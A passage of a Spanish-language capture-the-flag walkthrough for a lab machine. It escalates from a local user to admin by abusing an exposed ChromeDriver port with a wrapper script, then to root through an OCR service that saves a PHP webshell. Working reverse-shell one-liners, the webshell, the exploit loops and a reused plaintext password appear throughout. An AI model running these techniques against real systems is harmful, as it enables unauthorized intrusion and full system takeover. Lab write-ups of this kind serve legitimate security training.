/usr/lib/modules/6.8.0-117-generic/kernel/drivers/net/team/team_mode_activebackup.ko.zst
/usr/lib/modules/6.8.0-124-generic/kernel/drivers/power/supply/wm831x_backup.ko.zst
/usr/lib/modules/6.8.0-124-generic/kernel/drivers/net/team/team_mode_activebackup.ko.zst
/usr/lib/x86_64-linux-gnu/open-vm-tools/plugins/vmsvc/libvmbackup.so
/usr/src/linux-headers-6.8.0-124/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
/usr/src/linux-headers-6.8.0-124/tools/testing/selftests/net/test_bridge_backup_port.sh
/usr/src/linux-headers-6.8.0-117-generic/include/config/NET_TEAM_MODE_ACTIVEBACKUP
/usr/src/linux-headers-6.8.0-117-generic/include/config/WM831X_BACKUP
/usr/src/linux-headers-6.8.0-124-generic/include/config/NET_TEAM_MODE_ACTIVEBACKUP
/usr/src/linux-headers-6.8.0-124-generic/include/config/WM831X_BACKUP
/usr/src/linux-headers-6.8.0-117/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
/usr/src/linux-headers-6.8.0-117/tools/testing/selftests/net/test_bridge_backup_port.sh
/var/backups
/var/www/html/wp-includes/images/icon-library/backup.svg
/var/www/html/wp-content/upgrade-temp-backup
walter@makesense:~$ find / -writable -type d 2>/dev/null | grep -v "proc\|sys\|tmp"
/home/walter
/home/walter/.cache
/home/walter/.ssh
/run/user/1000
/run/user/1000/gnupg
/run/screen
/run/lock
/dev/mqueue
/dev/shm
/var/lib/php/sessions
/var/crash

```

Encontramos la pieza central: hay un proceso corriendo como **`admin`** llamado `prey-unified.py`, ubicado en `/home/admin/.process/`, que se lanza con variables de entorno `PREY_BASE_URL` y `PREY_HEADLESS=true`, y controla Chrome vía Selenium/chromedriver. Este es literalmente el "bot admin" que hemos estado explotando con el XSS. Si logramos leer o modificar ese script, o encontrar algo relacionado, probablemente ahí esté el camino a `admin` (y de ahí a root).

```bash
walter@makesense:~$ cat /home/admin/.process/prey-unified.py
cat: /home/admin/.process/prey-unified.py: Permission denied
walter@makesense:~$ cat /proc/19280/environ 2>/dev/null | tr '\0' '\n'
walter@makesense:~$ ls -la /proc/19280/cwd 2>/dev/null
cat /proc/19280/cmdline 2>/dev/null | tr '\0' ' '; echo

walter@makesense:~$ find / -iname "prey*" 2>/dev/null
walter@makesense:~$ cat /home/admin/automation.log 2>/dev/null
walter@makesense:~$ find /etc/systemd -iname "*prey*" 2>/dev/null
systemctl status prey* 2>/dev/null
cat /etc/systemd/system/*.service 2>/dev/null | grep -B5 -A5 -i prey
walter@makesense:~$ namei -l /home/admin/.process/prey-unified.py
f: /home/admin/.process/prey-unified.py
drwxr-xr-x root  root  /
drwxr-xr-x root  root  home
drwxr-x--- admin admin admin
                        .process - Permission denied

```

Eso es oro. **ChromeDriver expone un puerto HTTP (43335) con el protocolo WebDriver**, y corre como el usuario `admin`. Si ese puerto es accesible desde `localhost` (que casi seguro lo es, porque así es como Selenium se comunica con él), podemos abusar del WebDriver API para decirle a ChromeDriver que **lance un binario arbitrario** (como `/bin/bash`) en una nueva sesión — y como ChromeDriver corre como `admin`, ese proceso también correría como `admin`. Es una técnica de escalada conocida cuando un WebDriver/ChromeDriver queda expuesto.

### usa un script wrapper en vez de bash directo

En vez de apuntar `binary` directo a `/bin/bash`, apunta a un script que dispare la reverse shell en background y LUEGO se comporte de forma que no rompa inmediatamente (o que al menos la ejecución del comando ocurra antes de que falle el healthcheck).

Primero, crea el script (necesitas un directorio donde walter pueda escribir, como `/tmp`):

bash

```bash
cat << 'EOF' > /tmp/fake_chrome.sh
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.14.204/4445 0>&1" &
exec /opt/google/chrome/chrome "$@"
EOF
chmod +x /tmp/fake_chrome.sh
```

**Qué hace:** este script dispara la reverse shell en segundo plano (`&`, no bloqueante) y **luego** ejecuta el Chrome real con todos los argumentos originales (`exec ... "$@"`), para que ChromeDriver no detecte nada raro y no mate el proceso antes de tiempo. El `admin` es quien ejecutará este script (porque ChromeDriver corre como admin), así que la reverse shell también sale como `admin`.

### Ahora repite el ataque apuntando a ese wrapper

Ten el listener corriendo:

bash

```bash
nc -lvnp 4445
```

Y el loop de ataque, cambiando solo el `binary`:

bash

```bash
while true; do
  PORT=$(ps aux | grep chromedriver | grep -oP '(?<=--port=)\d+')
  if [ -n "$PORT" ]; then
    if ss -tln | grep -q ":$PORT "; then
      echo "[+] Puerto $PORT CONFIRMADO en LISTEN"
      curl -s -m 5 -X POST http://127.0.0.1:$PORT/session \
        -H "Content-Type: application/json" \
        -d '{"capabilities":{"alwaysMatch":{"goog:chromeOptions":{"binary":"/tmp/fake_chrome.sh"}}}}'
      break
    fi
  fi
  sleep 0.2
done
```

```bash
└─$ stty raw -echo; fg 
[1]  + continued  nc -lvnp 4445

admin@makesense:~$ id
uid=1001(admin) gid=1001(admin) groups=1001(admin),100(users)
admin@makesense:~$ 



```

---

## Movimiento lateral: de `admin` al servicio OCR interno

Con la shell de `admin` conseguida (vía el abuso del ChromeDriver expuesto), toca enumerar qué privilegios y qué servicios internos tiene disponibles este usuario que antes no veía como `walter`.

Algo que había quedado pendiente desde el escaneo inicial de Nmap: el puerto **8001/tcp** aparecía como `filtered` (`vcom-tunnel`) desde el exterior. Ahora que tengo shell local, tiene sentido probarlo por loopback — es muy típico en HTB que un puerto "filtrado" desde fuera sea, en realidad, un servicio interno pensado para consumirse solo desde `localhost`.

Efectivamente, en `127.0.0.1:8001` corre una aplicación web protegida con **HTTP Basic Auth**. Reutilizando la contraseña de `walter` que ya había encontrado en `wp-config.php` (`walter:JbhHDAEgXvri3!`), logro autenticarme sin problema — otra credencial reciclada, un patrón que ya se repitió antes con la base de datos de WordPress.

La aplicación es minimalista: un canvas HTML donde dibujas o escribes texto a mano, un botón "Recognize" que manda la imagen (como `data:image/png;base64,...` en el campo `canvas_image`) a un backend que hace **OCR** (reconocimiento óptico de caracteres) sobre la imagen, y devuelve el texto reconocido junto con un `ocr_id`. Después hay un segundo formulario, "Save as", que guarda ese texto reconocido en disco bajo `saved/<filename>`, usando solo el `ocr_id` como referencia (no vuelve a mandar el texto).

**La hipótesis de explotación es directa:** si el proceso que hace el OCR y guarda el archivo corre como `root`, y el nombre de archivo (`filename`) no está restringido a extensiones seguras, puedo:

1. Dibujar/renderizar un payload PHP en el canvas.
2. Que el OCR lo "lea" y lo transcriba a texto plano.
3. Guardarlo como `saved/shell.php`.
4. Visitar `saved/shell.php` para ejecutar código como el usuario que corre el servicio.

El plan es sólido, pero en la práctica automatizar el "dibujo a mano" del payload y lograr que el OCR lo transcriba **sin errores** resultó ser la parte más entretenida (y frustrante) de esta máquina.

---

## Generando el canvas automáticamente con Selenium

En vez de dibujar a mano con el mouse, uso `chromedriver` (ya disponible en el sistema, visto antes en el contexto del ataque al WebDriver) más `selenium` en Python para renderizar texto en un `<canvas>` vía JavaScript (`fillText`) y extraer el PNG resultante como `data:` URL con `toDataURL()`. Así controlo exactamente qué texto "dibujo".

### Intento 1 — comillas simples anidadas (falla)

Mi primer approach fue construir el payload PHP directo en un heredoc de bash y pasarlo a un f-string de Python. El problema: el servicio de OCR (o el proceso que renderiza/interpreta el texto) convertía la comilla simple `'` en una comilla tipográfica curva `‘`, rompiendo la sintaxis de bash en el payload reconstruido. Cero shell.

### Intento 2 — evitar comillas simples con base64

Para no depender de comillas simples en absoluto, codifiqué el comando de la reverse shell en base64 y lo decodifiqué en el propio shell del payload PHP:

```bash
B64=$(echo -n 'bash -i >& /dev/tcp/10.10.14.204/4447 0>&1' | base64 -w0)
echo "$B64"
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMDQvNDQ0NyAwPiYx
```

```python
payload = '<?php system("echo $B64 | base64 -d | bash"); ?>'
```

Aquí caí en un error clásico de f-strings de Python: usé `{{payload!r}}` (doble llave) dentro del f-string que genera el HTML, lo cual en Python **escapa** las llaves en vez de sustituir la variable. El JavaScript generado literalmente contenía el texto `{payload!r}` en vez del contenido real de `payload`. Corregido a una sola llave:

```python
ctx.fillText({payload!r}, 20, 100);
```

También tropecé exportando mal la variable de entorno `B64` entre bloques de comandos — cada vez que Python leía `os.environ['B64']` sin haber hecho `export B64=...` antes en esa misma sesión de shell, fallaba con `KeyError: 'B64'`. Lección aprendida: `export` solo persiste dentro de la misma sesión de shell activa, no entre "bloques" pegados por separado si algo interrumpe la sesión.

Con eso resuelto, el HTML generado se veía correcto:

```html
<!DOCTYPE html><html><body>
<canvas id="c" width="1000" height="200"></canvas>
<script>
const ctx = document.getElementById('c').getContext('2d');
ctx.fillStyle = 'white';
ctx.fillRect(0,0,1000,200);
ctx.fillStyle = 'black';
ctx.font = '22px monospace';
ctx.fillText('<?php system("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMDQvNDQ0NyAwPiYx | base64 -d | bash"); ?>', 20, 100);
</script>
</body></html>
```

Pero al mandarlo, el `output-text` salió vacío. El motivo: el payload (más de 110 caracteres) no cabía dentro de un canvas de 1000px de ancho con fuente de 22px — el texto se salía del área visible y el OCR no tenía nada legible que transcribir.

### Intento 3 — canvas más ancho, fuente en negrita

Agrandé el canvas a 2200x150 y reduje la fuente a 16px:

```python
python3 << 'EOF'
import os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service

B64 = os.environ['B64']

options = Options()
options.add_argument("--headless=new")
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")
options.add_argument("--disable-gpu")

driver = webdriver.Chrome(
    options=options,
    service=Service("/home/admin/.wdm/drivers/chromedriver/linux64/148.0.7778.178/chromedriver-linux64/chromedriver")
)

payload = f'<?php system("echo {B64} | base64 -d | bash"); ?>'

html = f"""<!DOCTYPE html><html><body>
<canvas id="c" width="2200" height="150"></canvas>
<script>
const ctx = document.getElementById('c').getContext('2d');
ctx.fillStyle = 'white';
ctx.fillRect(0,0,2200,150);
ctx.fillStyle = 'black';
ctx.font = '16px monospace';
ctx.fillText({payload!r}, 10, 80);
</script>
</body></html>"""

driver.set_window_size(2300, 250)
driver.get("data:text/html;charset=utf-8," + html)
data_url = driver.execute_script("return document.getElementById('c').toDataURL('image/png');")

with open('/tmp/canvas_b64shell.txt', 'w') as f:
    f.write(data_url)

print("OK")
driver.quit()
EOF
```

Esta vez el OCR sí reconoció algo, pero con **errores de transcripción**:

```
Original: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMDQvNDQ0NyAwPiYx
OCR leyó: YmFzaCAtaSA+JiAvZGV2L3Rj cC8xMC4xMC4xNC4yMDQvNDQONyAWPiYx
```

Dos fallos concretos: insertó un **espacio** en medio de la cadena, y confundió `0` (cero) con `O` (letra) y `w` con `W`. Verifiqué que el archivo guardado (`saved/test_check.txt`) contenía exactamente ese texto corrupto — si lo guardaba como `.php`, el `base64 -d` habría fallado al decodificar una cadena inválida.

```bash
curl -s -u walter:'JbhHDAEgXvri3!' http://127.0.0.1:8001/saved/test_check.txt
# <?php system("echo YmFzaCAtaSA+JiAvZGV2L3Rj cC8xMC4xMC4xNC4yMDQvNDQONyAWPiYx | base64 -d | bash"); ?>
```

Probé subir el tamaño de fuente a `bold 24px` para dar trazos más gruesos y definidos, pensando que ayudaría al reconocimiento:

```python
ctx.font = 'bold 24px monospace';
```

pero el resultado siguió teniendo el mismo tipo de error (`NDQ0NyAwPiYx` → `NDQONyAWPiYx`). El problema de fondo es que **base64 es un charset pésimo para OCR**: mezcla mayúsculas, minúsculas y dígitos visualmente ambiguos (`0`/`O`, `w`/`W`, `1`/`l`/`I`), y ningún ajuste de fuente lo resuelve del todo.

### Intento 4 — cambiar a hexadecimal

Pensando en reducir la ambigüedad, probé codificar el comando en **hexadecimal** en vez de base64 — solo usa `0-9` y `a-f`, todo en minúsculas:

```bash
export HEX=$(echo -n 'bash -i >& /dev/tcp/10.10.14.204/4447 0>&1' | xxd -p | tr -d '\n')
echo "$HEX"
```

```python
payload = f'<?php system("echo {HEX} | xxd -r -p | bash"); ?>'
```

El OCR reconoció el texto (con algún desliz menor todavía), y de paso me topé con otro problema no relacionado al OCR sino a mis propios comandos: `grep -oP` con expresiones regulares de una sola línea no capturaba el resultado porque el navegador había partido el `<p class="output-text">` en varias líneas físicas dentro del HTML. Tuve que usar un `perl -0777` en modo _slurp_ para poder hacer match multilínea:

```bash
perl -0777 -ne 'print "$1\n" if /<p class="output-text">(.*?)<\/p>/s' /tmp/r12.html
```

### Intento 5 (el bueno) — webshell corta, sin base64 ni hex

En vez de seguir peleando contra la precisión del OCR con cadenas largas, cambié de estrategia por completo: **hacer que la imagen contenga solo una webshell mínima**, y mandar el comando real como parámetro GET directamente por `curl`, sin depender del OCR para el comando en sí — solo para el payload PHP inicial, que ahora es corto y con caracteres simples y no ambiguos:

```python
python3 << 'EOF'
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service

options = Options()
options.add_argument("--headless=new")
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")
options.add_argument("--disable-gpu")

driver = webdriver.Chrome(
    options=options,
    service=Service("/home/admin/.wdm/drivers/chromedriver/linux64/148.0.7778.178/chromedriver-linux64/chromedriver")
)

payload = '<?php system($_GET["c"]); ?>'

html = f"""<!DOCTYPE html><html><body>
<canvas id="c" width="900" height="150"></canvas>
<script>
const ctx = document.getElementById('c').getContext('2d');
ctx.fillStyle = 'white';
ctx.fillRect(0,0,900,150);
ctx.fillStyle = 'black';
ctx.font = 'bold 30px monospace';
ctx.fillText({payload!r}, 10, 90);
</script>
</body></html>"""

driver.set_window_size(1000, 250)
driver.get("data:text/html;charset=utf-8," + html)
data_url = driver.execute_script("return document.getElementById('c').toDataURL('image/png');")

with open('/tmp/canvas_webshell.txt', 'w') as f:
    f.write(data_url)

print("OK - webshell canvas generado")
driver.quit()
EOF
```

```bash
rm -f /tmp/cookies.txt
WEBSHELL_URL=$(cat /tmp/canvas_webshell.txt)
curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt -u walter:'JbhHDAEgXvri3!' http://127.0.0.1:8001/ \
  --data-urlencode "canvas_image=${WEBSHELL_URL}" -o /tmp/r13.html -w "HTTP_CODE:%{http_code}\n"

perl -0777 -ne 'print "$1\n" if /<p class="output-text">(.*?)<\/p>/s' /tmp/r13.html
grep -oP 'name="ocr_id" value="\K[^"]+' /tmp/r13.html
```

Esta vez, reconocimiento perfecto, carácter por carácter:

```
<?php system($_GET["c"]); ?>
```

```
ocr_id: ocr_6ab6ec7c6a4bb0.25926899
```

**Lección clave de esta máquina:** cuando el OCR es el cuello de botella, no lo obligues a leer cosas largas y ambiguas — dale el payload mínimo posible y delega toda la complejidad al parámetro HTTP que sí controlas con precisión.

---

## Guardando la webshell y confirmando RCE como root

Con el `ocr_id` del texto ya reconocido correctamente, uso el segundo formulario ("Save as") para persistirlo en disco como `.php`:

```bash
curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt -u walter:'JbhHDAEgXvri3!' http://127.0.0.1:8001/ \
  --data-urlencode "ocr_id=ocr_6ab6ec7c6a4bb0.25926899" \
  --data-urlencode "filename=shell.php" \
  --data-urlencode "save_output=Save" \
  -o /tmp/r14.html -w "HTTP_CODE:%{http_code}\n"

grep -i 'notice success\|notice error' -A1 /tmp/r14.html
# <p class="notice success reveal">Saved as: saved/shell.php</p>
```

Y confirmo ejecución remota de comandos visitando la webshell con un comando simple:

```bash
curl -s -u walter:'JbhHDAEgXvri3!' http://127.0.0.1:8001/saved/shell.php?c=id
# uid=0(root) gid=0(root) groups=0(root)
```

**Confirmado: el servicio OCR corre como `root`.** El vector completo es: un servicio interno que procesa imágenes (OCR) sin validar ni sanear el nombre de archivo de guardado, ejecutándose con privilegios de administrador — al forzar que "reconozca" código PHP arbitrario y lo guarde con extensión `.php` dentro de un directorio servido por el propio backend, se obtiene ejecución de código como root.

---

## Reverse shell como root

Con el listener preparado en Kali:

```bash
nc -lvnp 4447
```

Disparo la reverse shell real pasando el comando por el parámetro `c` de la webshell (usando `curl -G --data-urlencode` para que caracteres como `&` y `>` se codifiquen correctamente sin tener que escaparlos a mano):

```bash
curl -s -u walter:'JbhHDAEgXvri3!' -G http://127.0.0.1:8001/saved/shell.php \
  --data-urlencode 'c=bash -c "bash -i >& /dev/tcp/10.10.14.204/4447 0>&1"'
```

Y la conexión llega:

```bash
bash: no job control in this shell
root@makesense:~/ocr4/saved# ls
pwned_by_admin.txt
shell.php
test1.txt
test2.txt
test_check.txt
```

**Root conseguido.** Estabilizo la terminal igual que hice antes con la shell de `www-data`:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
export TERM=xterm
stty rows 50 columns 200
```

![Shell root en MakeSense](../Images/Pasted%20image%2020260925165637.png)
---

## Resumen de la cadena completa

1. **Reconocimiento:** Nmap revela SSH, un sitio WordPress 7.0 en HTTPS, y un puerto `8001/filtered` que resultará ser clave más adelante.
2. **XSS almacenado** en el formulario de contacto de WordPress, confirmado con un bot admin que revisa mensajes periódicamente.
3. **Análisis del feature de voz (Whisper):** ingeniería inversa del cifrado AES-256-GCM en JS, replicado en Python para forjar mensajes de voz "transcritos" con contenido XSS controlado.
4. **Creación de usuario administrador** en WordPress vía el XSS, aprovechando la sesión autenticada del bot admin.
5. **RCE como `www-data`** editando un archivo `.php` del tema activo desde el editor de temas del panel de WordPress.
6. **Credenciales reusadas** encontradas en `wp-config.php` (`walter:JbhHDAEgXvri3!`), válidas también por SSH → **user flag**.
7. **Escalada a `admin`** abusando de un ChromeDriver/WebDriver expuesto en localhost que corría como ese usuario, sustituyendo el binario de Chrome por un wrapper que lanza una reverse shell antes de ejecutar el Chrome real.
8. **Servicio OCR interno en el puerto 8001** (el mismo que aparecía `filtered` en el nmap inicial), protegido con las mismas credenciales de `walter`, corriendo como `root`.
9. **Abuso del servicio OCR:** renderizar una webshell PHP mínima con Selenium/canvas, lograr que el OCR la transcriba sin errores, guardarla como `.php` en el directorio servido, y ejecutar comandos como root a través de ella → **root shell**.

Esta máquina fue un recordatorio de que en escalada de privilegios, "simple y corto" gana contra "complejo y largo" cuando hay un paso intermedio (como el OCR) que introduce ruido — mejor delegar la complejidad al canal que sí controlas con precisión (el parámetro HTTP) que forzarla por el canal ruidoso (el reconocimiento de texto).